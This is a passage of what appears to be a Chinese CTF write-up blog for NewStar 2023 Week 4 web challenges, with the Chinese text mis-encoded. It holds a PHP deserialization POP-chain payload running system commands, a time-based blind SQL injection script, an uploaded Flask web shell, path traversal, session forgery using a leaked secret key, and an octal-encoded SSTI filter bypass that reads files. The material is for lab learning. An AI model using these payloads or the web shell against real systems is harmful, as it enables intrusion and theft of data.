&#125;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line">   <span class="variable">$a</span>-&gt;errMsg = <span class="keyword">new</span> <span class="title class_">Crypto</span>();</span><br><span class="line">   <span class="variable">$a</span>-&gt;errMsg-&gt;obj = <span class="keyword">new</span> <span class="title class_">Reverse</span>();</span><br><span class="line">   <span class="variable">$a</span>-&gt;errMsg-&gt;obj-&gt;func = <span class="keyword">new</span> <span class="title class_">Pwn</span>();</span><br><span class="line">   <span class="variable">$a</span>-&gt;errMsg-&gt;obj-&gt;func-&gt;obj = <span class="keyword">new</span> <span class="title class_">Web</span>();</span><br><span class="line">   <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="variable">$a</span>, <span class="number">0</span>));</span><br><span class="line">   <span class="comment"># a:2:&#123;i:0;O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:7:&quot;cat /f*&quot;;&#125;&#125;&#125;&#125;&#125;i:1;i:0;&#125;</span></span><br></pre></td></tr></table></figure>
<p>æœ€ç»ˆpayloadï¼Œ<code>a:2:&#123;i:0;O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:7:&quot;cat /f*&quot;;&#125;&#125;&#125;&#125;&#125;i:0;i:0;&#125;</code></p>
<h3 id="midsql"><a href="#midsql" class="headerlink" title="midsql"></a>midsql</h3><p>è¾“å…¥ç©ºæ ¼<br><img src="https://picx.zhimg.com/80/v2-bc9a208e99942e079c728d128b2b2d81_1440w.png" alt=""><br><code>fuzz</code>ä¸€ä¸‹å‘ç°æ²¡æœ‰è¿‡æ»¤å…¶ä»–å­—ç¬¦ï¼Œç©ºæ ¼å¯ä»¥ç”¨<code>/**/</code>ä»£æ›¿<br><img src="https://picx.zhimg.com/80/v2-c0c23cf02a6eeabffb4e2bd9bbbb565a_1440w.png" alt=""><br>è¯´æ˜é¡µé¢æ²¡æœ‰å›æ˜¾æ˜¯å§<br>å¯ä»¥å€ŸåŠ©<code>sleep()</code>å‡½æ•°è¿›è¡Œæ—¶é—´ç›²æ³¨<br>å¤§ä½¬è„šæœ¬<br><a target="_blank" rel="noopener" href="https://iahzl.github.io/NewStar2023-WriteUp-Week4/#midsql">https://iahzl.github.io/NewStar2023-WriteUp-Week4/#midsql</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">last = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">127</span>, <span class="number">31</span>, -<span class="number">1</span>):</span><br><span class="line">        url = <span class="string">&#x27;http://f382fcdc-7812-48b9-b46f-74da5cf9ed13.node5.buuoj.cn:81/?id=&#x27;</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(schema_name)/**/from/**/information_schema.schemata),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27; # information_schema,mysql,performance_schema,sys,test,ctf</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;1/**/and/**/if((ascii(substr((select/**/database()),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27;</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/&quot;ctf&quot;),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27;</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/&quot;items&quot;),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27; # id,name,price</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(price)/**/from/**/ctf.items),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27;</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(id,0x3a,name,0x3a,price)/**/from/**/ctf.items),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27;</span></span><br><span class="line">        payload = <span class="string">f&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(name)/**/from/**/ctf.items),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;j&#125;</span>),sleep(3),0)&#x27;</span></span><br><span class="line">        url = url + payload</span><br><span class="line">        <span class="comment"># print(url)</span></span><br><span class="line">        start_time = time.time()</span><br><span class="line">        response = requests.get(url=url)</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        <span class="keyword">if</span> (end_time - start_time) &gt; <span class="number">3</span>:</span><br><span class="line">            last = result</span><br><span class="line">            result += <span class="built_in">chr</span>(j + <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥å­¦ä¹ ä¸€ä¸‹<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/qiushuo/p/17485659.html#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8">https://www.cnblogs.com/qiushuo/p/17485659.html#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8</a></p>
<h3 id="flask-disk"><a href="#flask-disk" class="headerlink" title="flask disk"></a>flask disk</h3><p>ç‚¹å‡»<code>admin manage</code><br><img src="https://picx.zhimg.com/80/v2-0ec0a0da6554b3824a75e88f2dda547b_1440w.png" alt=""><br>çœ‹åˆ°è¿™ä¸ªï¼Œæˆ‘æƒ³èµ·äº†ä¹‹å‰é‡åˆ°è¿‡<code>flask pin</code>(é¢˜ç›®æ˜¯è¦è®¡ç®—pinç ï¼Œè¿›å…¥æ§åˆ¶å°å®ç°å‘½ä»¤æ‰§è¡Œ)ï¼Œè¿™é‡Œå¼€å¯äº†<code>debug</code>æ¨¡å¼</p>
<p>å‚è€ƒå­¦ä¹ <br><a target="_blank" rel="noopener" href="https://blog.lxscloud.top/2022/10/09/CTF%E4%B8%ADPython_Flask%E5%BA%94%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/">https://blog.lxscloud.top/2022/10/09/CTF%E4%B8%ADPython_Flask%E5%BA%94%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</a><br>æ³¨æ„åˆ°æˆ‘ä»¬è¿™é‡Œæ˜¯å¯ä»¥è¿›è¡Œæ–‡ä»¶ä¸Šä¼ çš„<br><img src="https://pic1.zhimg.com/80/v2-dd93401fa8bcae7d319faddb74c304d7_1440w.png" alt=""></p>
<p>å®˜æ–¹å¦‚æ˜¯è¯´<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flaskå¼€å¯äº†debugæ¨¡å¼ä¸‹ï¼Œapp.pyæºæ–‡ä»¶è¢«ä¿®æ”¹åä¼šç«‹åˆ»åŠ è½½</span><br><span class="line"></span><br><span class="line">æ‰€ä»¥åªéœ€è¦ä¸Šä¼ ä¸€ä¸ªèƒ½rceçš„app.pyæ–‡ä»¶æŠŠåŸæ¥çš„è¦†ç›–ï¼Œå°±å¯ä»¥äº†</span><br><span class="line">æ³¨æ„è¯­æ³•ä¸èƒ½å‡ºé”™ï¼Œå¦åˆ™ä¼šå´©æºƒ</span><br></pre></td></tr></table></figure></p>
<p><strong>ä¸Šä¼ app.py</strong></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cmd = request.args.get(<span class="string">&#x27;cmd&#x27;</span>)</span><br><span class="line">        date = os.popen(cmd).read()</span><br><span class="line">        <span class="keyword">return</span> date</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;1&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">5000</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p><code>url/?cmd=cat /flag</code>ï¼Œæ‹¿åˆ°flag</p>
<h3 id="InjectMe"><a href="#InjectMe" class="headerlink" title="InjectMe"></a>InjectMe</h3><p>é™„ä»¶</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">FROM vulhub/flask:<span class="number">1.1</span><span class="number">.1</span></span><br><span class="line">ENV FLAG=flag&#123;not_here&#125;</span><br><span class="line">COPY src/ /app</span><br><span class="line">RUN mv /app/start.sh /start.sh &amp;&amp; chmod <span class="number">777</span> /start.sh</span><br><span class="line">CMD [ <span class="string">&quot;/start.sh&quot;</span> ]</span><br><span class="line">EXPOSE <span class="number">8080</span></span><br></pre></td></tr></table></figure>
<p><code>flask</code>æ¡†æ¶ï¼Œæ³„éœ²äº†ç›®å½•<code>./app</code></p>
<p>åŒå‡»å›¾ç‰‡ä½ ä¼šå‘ç°<br><img src="https://pica.zhimg.com/80/v2-807d402ab569b8fd924fa806cf9dc8cf_1440w.png" alt=""></p>
<p>wocï¼Œå´©é“ï¼Œé¥®æœˆå’Œç¬¦ç„ï¼Œå¥½è¯„ï¼Œä»–å–µçš„è¿˜æœ‰æœ€åä¸€è¯¾ï¼Œè¿™ä¹Ÿè¦åˆ€æˆ‘ï¼Ÿ<br><img src="https://pic1.zhimg.com/80/v2-b22ad96f7396819c3bb3ac27525a3643_1440w.png" alt=""></p>
<p>æœ‰æºç æ³„éœ²<br>æˆ‘ä»¬è¯•ç€ä¸‹è½½æ–‡ä»¶<code>app.py</code>ï¼Œå‘ç°<code>../</code>è¢«æ›¿æ¢æˆç©ºï¼Œè¿™ç§æƒ…å†µæˆ‘ä»¬ç›´æ¥åŒå†™ç»•è¿‡ï¼Œ<code>..././</code>æ˜¯å¯ä»¥æ›¿æ¢æˆ<code>../</code>çš„ï¼Œ<code>url/download?file=..././..././..././..././..././app/app.py</code><br><code>/etc/passwd</code>ï¼Œæ²¡ä»€ä¹ˆä¸œè¥¿</p>
<p><strong>app.py</strong></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, abort, send_file, session, render_template_string</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> secret_key</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = secret_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():  <span class="comment"># put application&#x27;s code here</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/cancanneed&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cancanneed</span>():</span><br><span class="line">    all_filename = os.listdir(<span class="string">&#x27;./static/img/&#x27;</span>)</span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;img.html&#x27;</span>, filename=filename, all_filename=all_filename)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">str</span>(os.listdir(<span class="string">&#x27;./static/img/&#x27;</span>))&#125;</span> &lt;br&gt; &lt;a href=\&quot;/cancanneed?file=1.jpg\&quot;&gt;/cancanneed?file=1.jpg&lt;/a&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/download&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename:</span><br><span class="line">        filename = filename.replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        filename = os.path.join(<span class="string">&#x27;static/img/&#x27;</span>, filename)</span><br><span class="line">        <span class="built_in">print</span>(filename)</span><br><span class="line">        <span class="keyword">if</span> (os.path.exists(filename)) <span class="keyword">and</span> (<span class="string">&quot;start&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> filename):</span><br><span class="line">            <span class="keyword">return</span> send_file(filename)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            abort(<span class="number">500</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        abort(<span class="number">404</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/backdoor&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(session.get(<span class="string">&quot;user&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">&quot;user&quot;</span>) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">        name = session.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> re.findall(</span><br><span class="line">                <span class="string">r&#x27;__|&#123;&#123;|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.&#x27;</span>,</span><br><span class="line">                name):</span><br><span class="line">            abort(<span class="number">500</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(</span><br><span class="line">                <span class="string">&#x27;ç«Ÿç„¶ç»™&lt;h1&gt;%s&lt;/h1&gt;ä½ æ‰¾åˆ°äº†æˆ‘çš„åé—¨ï¼Œä½ ä¸€å®šæ˜¯ç½‘ç»œå®‰å…¨å¤§èµ›å† å†›å§ï¼ğŸ˜ &lt;br&gt; é‚£ä¹ˆ ç°åœ¨è½®åˆ°ä½ äº†!&lt;br&gt; æœ€åç¥æ‚¨ç©å¾—æ„‰å¿«!ğŸ˜&#x27;</span> % name)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        abort(<span class="number">500</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page_not_find</span>(<span class="params">e</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;404.html&#x27;</span>), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">500</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">internal_server_error</span>(<span class="params">e</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;500.html&#x27;</span>), <span class="number">500</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>
<p>ä¸»è¦æ˜¯è¿™ä¸€æ®µ</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/backdoor&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(session.get(<span class="string">&quot;user&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">&quot;user&quot;</span>) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">        name = session.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> re.findall(</span><br><span class="line">                <span class="string">r&#x27;__|&#123;&#123;|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.&#x27;</span>,</span><br><span class="line">                name):</span><br><span class="line">            abort(<span class="number">500</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(</span><br><span class="line">                <span class="string">&#x27;ç«Ÿç„¶ç»™&lt;h1&gt;%s&lt;/h1&gt;ä½ æ‰¾åˆ°äº†æˆ‘çš„åé—¨ï¼Œä½ ä¸€å®šæ˜¯ç½‘ç»œå®‰å…¨å¤§èµ›å† å†›å§ï¼ğŸ˜ &lt;br&gt; é‚£ä¹ˆ ç°åœ¨è½®åˆ°ä½ äº†!&lt;br&gt; æœ€åç¥æ‚¨ç©å¾—æ„‰å¿«!ğŸ˜&#x27;</span> % name)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        abort(<span class="number">500</span>)</span><br></pre></td></tr></table></figure>
<p>æ ¹æ®è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ï¼Œæ˜¯è¦æ£€æµ‹<code>SSTIæ¨¡æ¿æ³¨å…¥</code>ï¼Œä½†æ˜¯è¿‡æ»¤äº†å¥½å¤šå•Šï¼Œè¿™ç§å°±è¦é ç¼–ç æ¥è¿›è¡Œç»•è¿‡äº†ï¼Œæƒ³èµ·äº†<code>unicodeç»•è¿‡</code>ï¼Œä½†æ˜¯ä¹Ÿè¿‡æ»¤äº†<code>\\u</code>ï¼Œåå…­è¿›åˆ¶<code>\\x</code>ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€‰æ‹©å…«è¿›åˆ¶</p>
<p>å¸¸è§çš„ç»•è¿‡(è¿™é‡Œæ²¡æœ‰å…«è¿›åˆ¶)<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/2ha0yuk7on/p/16648850.html#%E5%B8%B8%E8%A7%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF">https://www.cnblogs.com/2ha0yuk7on/p/16648850.html#%E5%B8%B8%E8%A7%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF</a></p>
<p>ç‹¼ç»„å®‰å…¨å›¢é˜Ÿå…¬å¼€çŸ¥è¯†åº“<br><a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/SSTI.html">https://wiki.wgpsec.org/knowledge/ctf/SSTI.html</a></p>
<p>è¿˜è¦æ³¨æ„<code>/backdoor</code>è·¯ç”±è¦è·å–<code>session</code>çš„<code>user</code>å€¼(name)<br>æˆ‘ä»¬çš„<code>payload</code>ä¼šä»<code>session</code>ä¸­æ¥ï¼Œæƒ³åˆ°<code>sessionä¼ªé€ </code><br>ä½†æ˜¯ï¼Œ<code>sessionä¼ªé€ </code>æ˜¯ä¸€å®šéœ€è¦<code>key</code>çš„</p>
<p>æ ¹æ®æºç ï¼Œ<code>secret_key</code>åœ¨<code>config.py</code>é‡Œï¼Œæˆ‘ä»¬å¯ä»¥è®¿é—®ä¸‹è½½å¾—åˆ°<code>key</code><br><code>url/download?file=..././..././..././..././..././app/config.py</code><br>å¾—åˆ°<code>secret_key = &quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&quot;</code></p>
<p>è®¿é—®<code>/backdoor</code>ï¼Œåœ¨<code>cookie</code>æ‹¿åˆ°<code>session</code>å€¼</p>
<p><a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a><br>è¯¥æ–‡ä»¶å¤¹ä¸‹æ‰“å¼€ç»ˆç«¯<br><code>python3  flask_session_cookie_manager3.py decode -s &quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&quot; -c &quot;eyJ1c2VyIjoiZ3Vlc3QifQ.Zj0JOw.aKlUzYl9rKnyJzQisZuj9pDeJLE&quot;</code><br><img src="https://picx.zhimg.com/80/v2-c911ef4524a04c0128a693e232a2a9c1_1440w.png" alt=""></p>
<p>å¯¹<code>user</code>å€¼è¿›è¡Œ<code>SSTI</code>æ¨¡æ¿æ³¨å…¥<br>æ­¤è„šæœ¬(å¤§ä½¬æ”¹åŠ¨å®˜æ–¹è„šæœ¬)æ¥è‡ª<br><a target="_blank" rel="noopener" href="https://iahzl.github.io/NewStar2023-WriteUp-Week4/#InjectMe">https://iahzl.github.io/NewStar2023-WriteUp-Week4/#InjectMe</a><br>ä¹Ÿå¯ä»¥æ‰‹åŠ¨ç¼–ç ï¼Œæ›´æ”¹<code>session</code>å€¼(ä¸€å¼€å§‹æˆ‘æ‹¿å®˜æ–¹çš„payloadè¿›è¡Œç¼–ç ï¼Œå¥½åƒæ²¡æ‰“å‡ºæ¥ï¼Ÿå¥‡æ€ªäº†)</p>
<p>å› ä¸ºæˆ‘æ˜¯ç»ˆç«¯æ‰§è¡Œpyæ–‡ä»¶ï¼Œæ‰€ä»¥<code>flask-session-cookie-manager3.py</code>éœ€è¦æ”¾åœ¨æ–‡ä»¶å¤¹<code>C:\Users\name</code>ä¸‹</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æŠŠè¿™ä¸ªä¸‹è½½äº†ï¼Œéœ€è¦ä½¿ç”¨é‡Œé¢çš„flask-session-cookie-manager3.py</span></span><br><span class="line"><span class="comment"># https://github.com/noraj/flask-session-cookie-manager</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">string_to_octal_ascii</span>(<span class="params">s</span>):</span><br><span class="line">    octal_ascii = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> s:</span><br><span class="line">        char_code = <span class="built_in">ord</span>(char)</span><br><span class="line">        octal_ascii += <span class="string">&quot;\\\\&quot;</span> + <span class="built_in">format</span>(char_code, <span class="string">&#x27;03o&#x27;</span>)</span><br><span class="line">    <span class="comment"># octal_ascii += &quot;\\\\&quot; + format(char_code, &#x27;o&#x27;)</span></span><br><span class="line">    <span class="keyword">return</span> octal_ascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">secret_key = <span class="string">&quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;&#123;%print(7*7)%&#125;&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;&#123;%print(\&quot;\&quot;\\\\u005f\\\\u005f\&quot;\&quot;)%&#125;&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;&#123;%print(\&quot;\&quot;\\\\x5f\\\\x5f\&quot;\&quot;)%&#125;&quot;</span></span><br><span class="line">eval_shell = <span class="string">&quot;\&quot;\&quot;&quot;</span> + \</span><br><span class="line">    string_to_octal_ascii(</span><br><span class="line">        <span class="string">&quot;__import__(\&quot;os\&quot;).popen(\&quot;cat /*\&quot;).read()&quot;</span>) + <span class="string">&quot;\&quot;\&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(eval_shell)</span><br><span class="line"><span class="comment"># dockeréƒ¨ç½²&amp;windowsè¿è¡Œpayload</span></span><br><span class="line"><span class="comment"># &#123;&#123;x.__init__.__globals__.__builtins__.eval(&#x27;__import__(&quot;os&quot;).popen(&quot;dir&quot;).read()&#x27;)&#125;&#125;</span></span><br><span class="line">payload = <span class="string">&quot;&#123;&#123;%print(xxx|attr(\&quot;\&quot;\\\\137\\\\137\\\\151\\\\156\\\\151\\\\164\\\\137\\\\137\&quot;\&quot;)|attr(\&quot;\&quot;\\\\137\\\\137\\\\147\\\\154\\\\157\\\\142\\\\141\\\\154\\\\163\\\\137\\\\137\&quot;\&quot;)|attr(\&quot;\&quot;\\\\137\\\\137\\\\147\\\\145\\\\164\\\\151\\\\164\\\\145\\\\155\\\\137\\\\137\&quot;\&quot;)(\&quot;\&quot;\\\\137\\\\137\\\\142\\\\165\\\\151\\\\154\\\\164\\\\151\\\\156\\\\163\\\\137\\\\137\&quot;\&quot;)|attr(\&quot;\&quot;\\\\137\\\\137\\\\147\\\\145\\\\164\\\\151\\\\164\\\\145\\\\155\\\\137\\\\137\&quot;\&quot;)(\&quot;\&quot;\\\\145\\\\166\\\\141\\\\154\&quot;\&quot;)(&#123;0&#125;))%&#125;&#125;&quot;</span>.<span class="built_in">format</span>(eval_shell)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">command = <span class="string">&quot;D:\\Python\\Python3.11\\python.exe flask_session_cookie_manager3.py encode -s \&quot;&#123;0&#125;\&quot; -t \&quot;&#123;&#123;&#x27;user&#x27;:&#x27;&#123;1&#125;&#x27;&#125;&#125;\&quot;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">    secret_key, payload)</span><br><span class="line"><span class="built_in">print</span>(command)</span><br><span class="line">session_data = subprocess.check_output(command, shell=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(session_data)</span><br><span class="line"><span class="comment"># linuxå’Œwindowsæ¢è¡Œä¸ä¸€æ ·ï¼Œlinuxæ˜¯å»æ‰æœ€åä¸€ä¸ªï¼Œwindowsæ˜¯æœ€åä¸¤ä¸ªã€‚</span></span><br><span class="line">session_data = session_data[:-<span class="number">2</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment"># session_data = session_data[:-1].decode(&#x27;utf-8&#x27;)</span></span><br><span class="line"><span class="built_in">print</span>(session_data)</span><br><span class="line">url = <span class="string">&quot;http://9dacbd81-0af6-4cd8-ac9b-3f7b8032cd60.node5.buuoj.cn:81/backdoor&quot;</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;session&quot;</span>: session_data&#125;</span><br><span class="line">res = requests.get(url=url, cookies=cookies)</span><br><span class="line"><span class="comment"># print(res.text)</span></span><br><span class="line">pattern = <span class="string">r&#x27;&lt;h1&gt;(.*)&lt;/h1&gt;&#x27;</span></span><br><span class="line">result_content = re.search(pattern, res.text, re.S)</span><br><span class="line"><span class="comment"># print(result_content)</span></span><br><span class="line"><span class="keyword">if</span> result_content:</span><br><span class="line">    result = result_content.group(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;something wrong!&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://picx.zhimg.com/80/v2-2c40f402a30f45a4baab05a1a4f7e3a7_1440w.png" alt=""></p>
<h3 id="PharOne"><a href="#PharOne" class="headerlink" title="PharOne"></a>PharOne</h3><p>F12å‘ç°<code>class.php</code></p>
